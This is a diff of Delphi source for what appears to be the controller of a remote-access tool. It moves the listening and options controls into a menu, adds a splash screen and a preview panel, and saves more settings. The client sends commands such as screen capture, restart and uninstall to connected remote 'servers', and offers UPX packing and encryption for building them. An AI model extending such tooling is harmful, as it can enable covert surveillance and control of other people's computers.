@@ -23,13 +23,15 @@ uses
   Menus, IniFiles, IdThreadMgrDefault,
   IdAntiFreeze, IdTCPServer,
   UnitVariables, gnugettext, CommCtrl, MMSystem, IdThreadMgr,
-  IdAntiFreezeBase, IdBaseComponent, IdComponent, ImgList, jpeg, UnitPlugins, UnitFunciones;
+  IdAntiFreezeBase, IdBaseComponent, IdComponent, ImgList, jpeg, UnitPlugins, UnitFunciones,
+  StdCtrls;
 
 const
   WM_POP_MESSAGE = WM_USER + 1; //Mensaje usado para las notificaciones
   WM_ICONTRAY = WM_USER + 2; //Mensaje usado para el icono en el system tray
   WM_EVENT_MESSAGE = WM_USER + 3; //Mensaje usado para los eventos
-  //Globo emergente
+
+//Globo emergente de notificación
   NIF_INFO = $10;
   NIF_MESSAGE = 1;
   NIF_ICON = 2;
@@ -62,24 +64,20 @@ type
     szInfoTitle: array[0..63] of char;
     dwInfoFlags: DWORD;
   end;
-  //Termina const globo emergente
+//Termina const globo emergente
+
 
 type
   TFormMain = class(TForm)
     StatusBar: TStatusBar;
     XPManifest: TXPManifest;
-    ImageTitulo: TImage;
-    BtnEscuchar: TSpeedButton;
     PopupMenuConexiones: TPopupMenu;
     Abrir1: TMenuItem;
     N1: TMenuItem;
     Ping1: TMenuItem;
     Cambiarnombre1: TMenuItem;
     ImageList: TImageList;
-    BtnOpciones: TSpeedButton;
-    BtnAbout: TSpeedButton;
     ListViewConexiones: TListView;
-    BtnConfigServer: TSpeedButton;
     ServerSocket: TIdTCPServer;
     IdAntiFreeze1: TIdAntiFreeze;
     IdThreadMgrDefault1: TIdThreadMgrDefault;
@@ -125,17 +123,27 @@ type
     Reiniciar1: TMenuItem;
     Suspender1: TMenuItem;
     Hibernar1: TMenuItem;
+    MenuPrincipal: TMainMenu;
+    Opciones1: TMenuItem;
+    Configurarservidor1: TMenuItem;
+    Escuchar2: TMenuItem;
+    Acercade2: TMenuItem;
+    GroupBoxPanel: TGroupBox;
+    SpeedButton1: TSpeedButton;
+    LabelInfo: TLabel;
+    ImageDesktop: TImage;
+    SpeedButtonAvisarActividad: TSpeedButton;
+    SpeedButtonAvisarCambioVentana: TSpeedButton;
+    Splitter: TSplitter;
+    SpeedButtonCarpetaUser: TSpeedButton;
     procedure BtnEscucharClick(Sender: TObject);
     procedure ListViewConexionesContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
     procedure Abrir1Click(Sender: TObject);
-    procedure BtnOpcionesClick(Sender: TObject);
-    procedure BtnAboutClick(Sender: TObject);
     procedure Cambiarnombre1Click(Sender: TObject);
     procedure Ping1Click(Sender: TObject);
     procedure LeerArchivoINI();
     procedure GuardarArchivoINI();
     procedure FormClose(Sender: TObject; var Action: TCloseAction);
-    procedure BtnConfigServerClick(Sender: TObject);
     procedure ServerSocketConnect(AThread: TIdPeerThread);
     procedure ServerSocketExecute(AThread: TIdPeerThread);
     procedure ServerSocketDisconnect(AThread: TIdPeerThread);
@@ -156,7 +164,6 @@ type
     function GetIndex(aNMHdr: pNMHdr): Integer;
     function SearchColumnById(ID: Integer): Integer;
     procedure Cerrar1Click(Sender: TObject);
-    procedure FormCanResize(Sender: TObject; var NewWidth, NewHeight: Integer; var Resize: Boolean);
     procedure Desinstalar1Click(Sender: TObject);
     procedure Actualizar1Click(Sender: TObject);
     procedure StatusBarMouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
@@ -172,6 +179,20 @@ type
     procedure Reiniciar1Click(Sender: TObject);
     procedure Suspender1Click(Sender: TObject);
     procedure Hibernar1Click(Sender: TObject);
+    procedure Opciones1Click(Sender: TObject);
+    procedure Acercade2Click(Sender: TObject);
+    procedure Configurarservidor1Click(Sender: TObject);
+    procedure Escuchar2Click(Sender: TObject);
+    procedure ImageDesktopClick(Sender: TObject);
+    procedure SpeedButton1Click(Sender: TObject);
+    procedure ListViewConexionesSelectItem(Sender: TObject;
+      Item: TListItem; Selected: Boolean);
+    procedure SpeedButtonAvisarActividadClick(Sender: TObject);
+    procedure SplitterMoved(Sender: TObject);
+    procedure SpeedButtonAvisarCambioVentanaClick(Sender: TObject);
+    procedure ServerSocketException(AThread: TIdPeerThread;
+      AException: Exception);
+    procedure SpeedButtonCarpetaUserClick(Sender: TObject);
   private
     ColumnaOrdenada, Columna: Integer;
     WndMethod: TWndMethod;
@@ -179,7 +200,7 @@ type
     TrayIconData: TNotifyIconData;
     //El record donde se guarda la información del icono del tray
     ServerSockets: array[0..9] of TIdTCPServer;
-    NumeroConexiones: Integer;//El número de servidores que hay conectados
+    NumeroConexiones: Integer;  //El número de servidores que hay conectados
     procedure OnPopMessage(var Msg: TMessage); message WM_POP_MESSAGE;
     procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
     procedure OnEventReceive(var Msg: TMessage); message WM_EVENT_MESSAGE;
@@ -224,7 +245,7 @@ uses
   UnitFormControl,
   UnitFormNotifica,
   UnitEstadisticasConexiones,
-  ScreenMaxCap;
+  ScreenMaxCap, UnitFormSplash;
 
 {$R *.dfm}
 
@@ -233,7 +254,7 @@ begin
   GuardarArchivoINI();
 
   if ServerSocket.Active then
-    BtnEscuchar.Click;
+    Escuchar2.Click;
   Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
   ListViewConexiones.WindowProc := WndMethod;
   exitprocess(0);
@@ -256,126 +277,8 @@ end;
 //Fin de eventos del Formulario
 
 //Eventos de los botones del Formulario
-procedure TFormMain.BtnConfigServerClick(Sender: TObject);
-begin
-  FormConfigServer.Show;
-end;
-
-procedure TFormMain.BtnOpcionesClick(Sender: TObject);
-begin
-  FormOpciones.ShowModal();
-end;
-
-procedure TFormMain.BtnAboutClick(Sender: TObject);
-begin
-  if (FormAbout.Showing <> True) then
-    FormAbout.ShowModal;
-end;
-
 procedure TFormMain.BtnEscucharClick(Sender: TObject);
-var
-  h: TBitmap;
-  i: Integer;
-  List: TList;
-  Athread: TidPeerThread;
-  o: Integer;
-  Puertos: string;
-  Puerto: string;
-
 begin
-  Puertos := FormOpciones.EditPuerto.Text;
-  NumeroConexiones := 0;
-  if Copy(puertos, Length(puertos), 1) <> ';' then
-    Puertos := Puertos + ';';
-  if BtnEscuchar.Caption = _('Escuchar') then
-    begin
-      while Pos(';', Puertos) > 0 do
-        begin
-          if o > 10 then break; //Máximo 10 puertos
-          Puerto := Copy(Puertos, 1, Pos(';', Puertos) - 1);
-          Delete(Puertos, 1, Pos(';', Puertos));
-          if ServerSockets[o] = nil then
-            begin
-              ServerSockets[o] := TIdTCPServer.Create(nil);
-              ServerSockets[o].Active := False;
-              ServerSockets[o].OnExecute := Serversocket.OnExecute;
-              ServerSockets[o].OnConnect := Serversocket.OnConnect;
-              ServerSockets[o].OnDisconnect := Serversocket.OnDisconnect;
-              ServerSockets[o].ThreadMgr := IdThreadMgrDefault1;
-            end;
-          try
-            ServerSockets[o].DefaultPort := StrToIntDef(Puerto, 80);
-            if StrToIntDef(Puerto, -1) <> -1 then
-              ServerSockets[o].Active := True;
-            FormOpciones.EditPuerto.Enabled := False;
-            BtnEscuchar.Caption := _('Detener');
-            Escuchar1.Checked := True;
-          except
-            MessageDlg(_('El puerto ') + Puerto +
-              _(' ya está en uso o hay un firewall bloqueándolo, elija otro'), mtWarning, [mbOK], 0);
-          end;
-          o := o + 1;
-        end;
-
-      try
-        h := TBitmap.Create;
-        h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\detener.bmp');
-        BtnEscuchar.Glyph := h;
-      finally
-        h.Free;
-      end;
-      StatusBar.Panels[0].Text := _('Esperando conexiones');
-      StatusBar.Panels[1].Text := _('Puerto(s): ') + FormOpciones.EditPuerto.Text;
-    end
-  else
-    begin
-      o := 0;
-      while True do
-        begin
-          if o > 9 then break; //Máximo 10 puertos
-          if Serversockets[o] <> nil then
-            begin
-              if Serversockets[o].Active then
-                begin
-                  List := ServerSockets[o].Threads.LockList;
-                  for i := 0 to List.Count - 1 do
-                    begin
-                      Athread := TidPeerThread(List.Items[i]);
-                      if Athread.Connection.Connected then
-                        begin
-                          Athread.Suspend;
-                          Athread.Connection.Disconnect;
-                          Athread.FreeOnTerminate := True;
-                          Athread.Terminate;
-                          List[i] := nil;
-                          Athread := nil;
-                        end;
-                    end;
-                  ServerSockets[o].Threads.Clear;
-                  ServerSockets[o].Threads.UnlockList;
-                  ServerSockets[o].Active := False;
-                  ServerSockets[o].Bindings.Clear;
-                end;
-              ServerSockets[o].Free;
-              ServerSockets[o] := nil;
-            end;
-          o := o + 1;
-        end;
-      ListViewConexiones.Clear;
-      FormOpciones.EditPuerto.Enabled := True;
-      BtnEscuchar.Caption := _('Escuchar');
-      Escuchar1.Checked := False;
-      try
-        h := TBitmap.Create;
-        h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\escuchar.bmp');
-        BtnEscuchar.Glyph := h;
-      except
-        MessageDlg(_('No se puede cargar la imagen: ') + ExtractFilePath(ParamStr(0)) +
-          'Recursos\Imagenes\escuchar.bmp', mtWarning, [mbOK], 0);
-      end;
-      h.Free;
-      StatusBar.Panels[0].Text := _('Escucha detenida');
-    end;
 
 end;
 //Fin de los eventos de los botones del Formulario
@@ -409,10 +312,18 @@ begin
 end;
 
 //Eventos del ServerSocket
+{
+Nueva conexión desde el servidor, puede ser tanto una conexión principal
+como una conexión secundaria para las funciones captura de pantalla,
+webcam, transferencia de archivos...
+}
 procedure TFormMain.ServerSocketConnect(AThread: TIdPeerThread);
 begin
   AThread.Connection.MaxLineLength := 1024 * 1024; //Long Max linea
+  try
   ConnectionWriteLn(AThread, 'MAININFO|' + IntToStr(Athread.Handle));
+  except
+  end;
 end;
 
 procedure TFormMain.ServerSocketDisconnect(AThread: TIdPeerThread);
@@ -555,7 +466,9 @@ begin
   {Si llega aquí es que el SocketHandle no se encontró entre los SocketHandles
    de las conexiones principales y una de dos:
    -Es un nuevo server
-   -Es una conexión para la transferencia de ficheros}
+   -Es una conexión para la transferencia de ficheros
+   -Es una conexión para la captura de pantalla
+   }
 
   {Es un nuevo servidor, recibimos la información principal del server
    para mostrar en el ListViewConexiones}
@@ -636,6 +549,7 @@ begin
               end;
             Exit;
           end;
+
     end;
 
   //Buscamos a que item corresponde la conexión
@@ -653,6 +567,8 @@ begin
               end;
             Exit;
           end;
+
+  
 end;
 //Fin de eventos del ServerSocket
 
@@ -696,12 +612,12 @@ begin
 
   while Assigned(mslistviewitem) do
     begin
-      if (mslistviewitem.SubItems[4] <> '.') then
+        if (mslistviewitem.SubItems[4] <> '.') then
         begin
-          AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
-          ConnectionWriteLn(AThread, 'PING');
-          //Como objeto 2 guardamos una captura del tiempo en milisegundos
-          mslistviewitem.SubItems.Objects[2] := TObject(GetTickCount());
+            AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
+            ConnectionWriteLn(AThread, 'PING');
+            //Como objeto 2 guardamos una captura del tiempo en milisegundos
+            mslistviewitem.SubItems.Objects[2] := TObject(GetTickCount());
         end;
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
@@ -715,13 +631,15 @@ end;
 //Al pulsar en la columna del ListViewConexiones ordenar filas según el valor de esa columna
 procedure TFormMain.ListViewConexionesColumnClick(Sender: TObject; Column: TListColumn);
 begin
-  Columna := Column.Index;
+{  Columna := Column.Index;
+
   ListViewConexiones.AlphaSort;
   //Para acordarnos de que columna está ordenada
+
   if Columna <> ColumnaOrdenada then
     ColumnaOrdenada := Columna
   else
-    ColumnaOrdenada := -1;
+    ColumnaOrdenada := -1; }
 end;
 
 //Para ordenar el ListViewConexiones
@@ -803,6 +721,13 @@ begin
         LabeledDirDownloads.Text := Ini.ReadString('Opciones', 'PathDescargas', '%CoolDir%\Usuarios\%Identificator%\Descargas\');
         CheckBoxGuardarPluginsEnDisco.Checked := Ini.ReadBool('Opciones', 'GuardarPluginsADisco', True);
         CheckBoxIncluirTreeView.Checked := Ini.ReadBool('Opciones', 'IncluirTreeViewArchivos', True);
+        CheckBoxTreeViewCC.Checked := Ini.ReadBool('Opciones', 'IncluirTreeViewCC', True);
+        CheckBoxAyuda1.Checked := Ini.ReadBool('Opciones', 'CheckBoxAyuda1', True);
+        CheckBoxAyuda2.Checked := Ini.ReadBool('Opciones', 'CheckBoxAyuda2', True);
+        CheckBoxAyuda3.Checked := Ini.ReadBool('Opciones', 'CheckBoxAyuda3', True);
+        CheckBoxPanelInferior.Checked := Ini.ReadBool('Opciones', 'MostrarPanelInferior', False);
+        CheckBoxCapturaInferior.Checked := Ini.ReadBool('Opciones', 'CapturaInferior', False);
+        CheckBoxSplash.Checked := Ini.ReadBool('Opciones', 'Splash', True);
       end;
 
       Tempstr := FormOpciones.Plugins;   //añadimos los plugins al listview
@@ -847,7 +772,8 @@ begin
           Ini.ReadBool('ConfigurarServidor', 'ComprimirUPX', False);
         CheckBoxCifrar.Checked :=
           Ini.ReadBool('ConfigurarServidor', 'Cifrar', False);
-
+        CheckBoxEscribirADisco.Checked :=
+          Ini.ReadBool('ConfigurarServidor', 'EscribirADisco', False);
       end;
 
     for i := 0 to listviewconexiones.columns.Count - 1 do
@@ -867,11 +793,16 @@ begin
             PopupMenuColumnas.Items[i].Checked := True;
           end;
       end;
-
+    {Apraciencia de las forms}
     Self.Width := Ini.ReadInteger('AparienciaCliente', 'FormMainWidth', Self.Width);
     Self.Height := Ini.ReadInteger('AparienciaCliente', 'FormMainHeight', Self.Height);
     ControlWidth := Ini.ReadInteger('AparienciaCliente', 'FormControlWidth', ControlWidth);
     ControlHeight := Ini.ReadInteger('AparienciaCliente', 'FormControlHeight', ControlHeight);
+    FormOpciones.Width := Ini.ReadInteger('AparienciaCliente', 'FormOpcionesWidth', FormOpciones.Width);
+    FormOpciones.Height := Ini.ReadInteger('AparienciaCliente', 'FormOpcionesHeight', FormOpciones.Height);
+    FormConfigServer.Width := Ini.ReadInteger('AparienciaCliente', 'FormConfigServerWidth', FormConfigServer.Width);
+    FormConfigServer.Height := Ini.ReadInteger('AparienciaCliente', 'FormConfigServerHeight', FormConfigServer.Height);
+
   finally
     Ini.Free;
   end;
@@ -917,16 +848,28 @@ begin
       FormOpciones.CheckBoxCCIndependiente.Checked);
     Ini.WriteBool('Opciones', 'IncluirTreeViewArchivos',
       FormOpciones.CheckBoxIncluirTreeView.Checked);
-
+    Ini.WriteBool('Opciones', 'IncluirTreeViewCC',
+      FormOpciones.CheckBoxTreeViewCC.Checked);
     Ini.WriteString('Opciones', 'PathUsuario', FormOpciones.LabeledEditDirUser.Text);
     Ini.WriteString('Opciones', 'PathCapturas', FormOpciones.LabeledDirScreen.Text);
     Ini.WriteString('Opciones', 'PathWebcam', FormOpciones.LabeledDirWebcam.Text);
     Ini.WriteString('Opciones', 'PathMiniaturas', FormOpciones.LabeledDirThumbs.Text);
     Ini.WriteString('Opciones', 'PathDescargas', FormOpciones.LabeledDirDownloads.Text);
-
     Ini.WriteBool('Opciones', 'GuardarPluginsADisco',
       FormOpciones.CheckBoxGuardarPluginsEnDisco.Checked);
-      
+    Ini.WriteBool('Opciones', 'CheckBoxAyuda1',
+      FormOpciones.CheckBoxAyuda1.Checked);
+    Ini.WriteBool('Opciones', 'CheckBoxAyuda2',
+      FormOpciones.CheckBoxAyuda2.Checked);
+    Ini.WriteBool('Opciones', 'CheckBoxAyuda3',
+      FormOpciones.CheckBoxAyuda3.Checked);
+    Ini.WriteBool('Opciones', 'MostrarPanelInferior',
+      FormOpciones.CheckBoxPanelInferior.Checked);
+    Ini.WriteBool('Opciones', 'CapturaInferior',
+      FormOpciones.CheckBoxCapturaInferior.Checked);
+    Ini.WriteBool('Opciones', 'Splash',
+      FormOpciones.CheckBoxSplash.Checked);
+
     //Valores de la Form de Configuracion del server
     Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
     Ini.WriteString('ConfigurarServidor', 'Conectar', FormConfigServer.ipsypuertos);
@@ -957,6 +900,8 @@ begin
       FormConfigServer.CheckBoxUPX.Checked);
     Ini.WriteBool('ConfigurarServidor', 'Cifrar',
       FormConfigServer.CheckBoxCifrar.Checked);
+    Ini.WriteBool('ConfigurarServidor', 'EscribirADisco',
+      FormConfigServer.CheckBoxEscribirADisco.Checked);
 
     //Guardamos el estado de las columnas del Tlistview :D
     for i := 0 to Listviewconexiones.columns.Count - 1 do
@@ -975,6 +920,14 @@ begin
     Ini.WriteInteger('AparienciaCliente', 'FormMainWidth', Self.Width);
     Ini.WriteInteger('AparienciaCliente', 'FormControlHeight', ControlHeight);
     Ini.WriteInteger('AparienciaCliente', 'FormControlWidth', ControlWidth);
+    Ini.WriteInteger('AparienciaCliente', 'FormOpcionesHeight', FormOpciones.Height);
+    Ini.WriteInteger('AparienciaCliente', 'FormOpcionesWidth', FormOpciones.Width);
+    Ini.WriteInteger('AparienciaCliente', 'FormConfigServerHeight', FormConfigServer.Height);
+    Ini.WriteInteger('AparienciaCliente', 'FormConfigServerWidth', FormConfigServer.Width);
+
+    GroupBoxPanel.Visible := FormOpciones.CheckBoxPanelInferior.Checked;
+    ImageDesktop.Visible := FormOpciones.CheckBoxCapturaInferior.Checked;
+    Splitter.Visible := GroupBoxPanel.Visible;
   finally
     Ini.Free;
   end;
@@ -991,8 +944,9 @@ begin
   Application.HintPause := 200;
 
   //Inicializar el icono de la TrayBar
-  Self.DoubleBuffered := True; //Evita parpadeos
-  Self.ListViewConexiones.DoubleBuffered := True;
+  //Self.DoubleBuffered := true;
+  Self.ListViewConexiones.DoubleBuffered := true; //Evita parpadeos
+ 
   TrayIconData.cbSize := SizeOf(TrayIconData);
   TrayIconData.Wnd := Handle;
   TrayIconData.uID := 0;
@@ -1062,13 +1016,16 @@ begin
 
   if PrimeraVezQueMeMuestro then
     begin
+      Escuchar2.Caption := _('Escuchar');
       WndMethod := ListViewConexiones.WindowProc;
       ListViewConexiones.WindowProc := CheckMesg;
       Traducir();
       StatusBar.Panels[0].Text := _('Estado: No escuchando');
       LeerArchivoINI();
+      if FormOpciones.CheckBoxSplash.Checked then
+        FormSplash.ShowModal();
       if FormOpciones.CheckBoxEscucharAlIniciar.Checked then
-        BtnEscuchar.Click;
+        Escuchar2.Click;
       TimerMandarPing.Interval := StrToIntDef(FormOpciones.EditPingTimerInterval.Text, 30) * 1000;
       TimerMandarPing.Enabled := FormOpciones.CheckBoxMandarPingAuto.Checked;
 
@@ -1157,9 +1114,14 @@ begin //Mandar Ping cada 30 segundos
         if ((ListViewConexiones.Items[i].SubItems[4] <> '.') and (ListViewConexiones.Items[i].SubItems.Objects[0] <> nil)) then //solo si no estamos mandando ping
           begin
             AThread := TidPeerThread(ListViewConexiones.Items[i].SubItems.Objects[0]);
-            ConnectionWriteLn(AThread, 'PING');
+            try
+              ConnectionWriteLn(AThread, 'PING');
+              ListViewConexiones.Items[i].SubItems.Objects[2] := TObject(GetTickCount());
+            except
+              Athread.terminate;
+            end;
             //Como objeto 2 guardamos una captura del tiempo en milisegundos
-            ListViewConexiones.Items[i].SubItems.Objects[2] := TObject(GetTickCount());
+
           end;
     end;
 end;
@@ -1310,15 +1272,6 @@ begin
       ConnectionWriteLn(AThread, 'SERVIDOR|CERRAR|');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
-end;
-
-procedure TFormMain.FormCanResize(Sender: TObject; var NewWidth,
-  NewHeight: Integer; var Resize: Boolean);
-begin
-  if Newwidth < 505 then
-    ImageTitulo.Visible := False
-  else
-    ImageTitulo.Visible := True;
 end;
 
 procedure TFormMain.Desinstalar1Click(Sender: TObject);
@@ -1546,8 +1499,7 @@ var
 begin
 
   if MessageBoxW(Handle,
-    Pwidechar(_('¿Está seguro de que desea reiniciar el pc del servidor(es) seleccionado(s)?')),
-    pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
+    Pwidechar(_('¿Está seguro de que desea reiniciar el pc del servidor(es) seleccionado(s)?')), pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
     Exit;
   mslistviewitem := ListViewConexiones.Selected;
   while Assigned(mslistviewitem) do
@@ -1596,6 +1548,167 @@ begin
       ConnectionWriteLn(AThread, 'HIBERNARPC');
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
+end;
+
+procedure TFormMain.Opciones1Click(Sender: TObject);
+begin
+  FormOpciones.ShowModal();
+end;
+
+procedure TFormMain.Acercade2Click(Sender: TObject);
+begin
+  if (FormAbout.Showing <> True) then
+    FormAbout.ShowModal;
+end;
+
+procedure TFormMain.Configurarservidor1Click(Sender: TObject);
+begin
+  FormConfigServer.Show;
+end;
+
+procedure TFormMain.Escuchar2Click(Sender: TObject);
+var
+  i: Integer;
+  List: TList;
+  Athread: TidPeerThread;
+  o: Integer;
+  Puertos: string;
+  Puerto: string;
+begin
+  Puertos := FormOpciones.EditPuerto.Text;
+  NumeroConexiones := 0;
+  if Copy(puertos, Length(puertos), 1) <> ';' then
+    Puertos := Puertos + ';';
+  if not Escuchar2.Checked then
+    begin
+      while Pos(';', Puertos) > 0 do
+        begin
+          if o > 10 then break; //Máximo 10 puertos
+          Puerto := Copy(Puertos, 1, Pos(';', Puertos) - 1);
+          Delete(Puertos, 1, Pos(';', Puertos));
+          if ServerSockets[o] = nil then
+            begin
+              ServerSockets[o] := TIdTCPServer.Create(nil);
+              ServerSockets[o].Active := False;
+              ServerSockets[o].OnExecute := Serversocket.OnExecute;
+              ServerSockets[o].OnConnect := Serversocket.OnConnect;
+              ServerSockets[o].OnDisconnect := Serversocket.OnDisconnect;
+              ServerSockets[o].ThreadMgr := IdThreadMgrDefault1;
+            end;
+          try
+            ServerSockets[o].DefaultPort := StrToIntDef(Puerto, 80);
+            if StrToIntDef(Puerto, -1) <> -1 then
+              ServerSockets[o].Active := True;
+            FormOpciones.EditPuerto.Enabled := False;
+            Escuchar2.Caption := _('Detener');
+            Escuchar1.Checked := True;
+          except
+            MessageDlg(_('El puerto ') + Puerto +
+              _(' ya está en uso o hay un firewall bloqueándolo, elija otro'), mtWarning, [mbOK], 0);
+          end;
+          o := o + 1;
+        end;
+
+      Escuchar2.ImageIndex := 270;
+      StatusBar.Panels[0].Text := _('Esperando conexiones');
+      StatusBar.Panels[1].Text := _('Puerto(s): ') + FormOpciones.EditPuerto.Text;
+      Escuchar2.Checked := true;
+    end
+  else
+    begin {Dejar de escuchar en los puertos seleccionados}
+      o := 0;
+      while True do
+        begin
+          if o > 9 then break; //Máximo 10 puertos
+          if Serversockets[o] <> nil then
+            begin
+              if Serversockets[o].Active then
+                begin
+                  List := ServerSockets[o].Threads.LockList;
+                  for i := 0 to List.Count - 1 do
+                    begin
+                      Athread := TidPeerThread(List.Items[i]);
+                      if Athread.Connection.Connected then
+                        begin
+                          Athread.Suspend;
+                          Athread.Connection.Disconnect;
+                          Athread.FreeOnTerminate := True;
+                          Athread.Terminate;
+                          List[i] := nil;
+                          Athread := nil;
+                        end;
+                    end;
+                  ServerSockets[o].Threads.Clear;
+                  ServerSockets[o].Threads.UnlockList;
+                  ServerSockets[o].Active := False;
+                  ServerSockets[o].Bindings.Clear;
+                end;
+              ServerSockets[o].Free;
+              ServerSockets[o] := nil;
+            end;
+          o := o + 1;
+        end;
+      ListViewConexiones.Clear;
+      FormOpciones.EditPuerto.Enabled := True;
+      Escuchar2.Caption := _('Escuchar');
+      Escuchar1.Checked := False;
+      Escuchar2.ImageIndex := 268;
+      StatusBar.Panels[0].Text := _('Escucha detenida');
+      Escuchar2.Checked := false;
+    end;
+
+end;
+
+
+procedure TFormMain.ImageDesktopClick(Sender: TObject);
+begin
+  Capturapantalla1Click(Sender);
+end;
+
+procedure TFormMain.SpeedButton1Click(Sender: TObject);
+begin
+  Abrir1Click(Sender);
+end;
+
+procedure TFormMain.ListViewConexionesSelectItem(Sender: TObject;
+  Item: TListItem; Selected: Boolean);
+var
+  VentanaControl : TFormControl;
+begin
+  if (FormOpciones.CheckBoxCapturaInferior.Checked and FormOpciones.CheckBoxPanelInferior.Checked and (ListViewConexiones.Selected <> nil)) then
+  begin
+    VentanaControl := TFormControl(CrearVentanaControl(ListViewConexiones.Selected)); {Hay que generar el centro de control para recibir la captura :(}
+    ConnectionWriteLn(TidPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]), 'CAPSCREEN|70|' + IntToStr(ImageDesktop.Height) + '|');
+  end;
+  LabelInfo.Caption := IntToStr(ListViewConexiones.SelCount)+' Clientes seleccionados';
+end;
+
+procedure TFormMain.SpeedButtonAvisarActividadClick(Sender: TObject);
+begin
+VuelvaaaveractividadenelPC1Click(Sender);
+end;
+
+procedure TFormMain.SplitterMoved(Sender: TObject);
+begin
+  
+  ListViewConexiones.OnSelectItem(Sender, nil, true);
+end;
+
+procedure TFormMain.SpeedButtonAvisarCambioVentanaClick(Sender: TObject);
+begin
+  Cambiedeventana1Click(Sender);
+end;
+
+procedure TFormMain.ServerSocketException(AThread: TIdPeerThread;
+  AException: Exception);
+begin
+    AException := nil;
+    AThread.Terminate;
+end;
+
+procedure TFormMain.SpeedButtonCarpetaUserClick(Sender: TObject);
+begin
+  Abrirdirectoriousuario1Click(Sender);
 end;
 
 end.
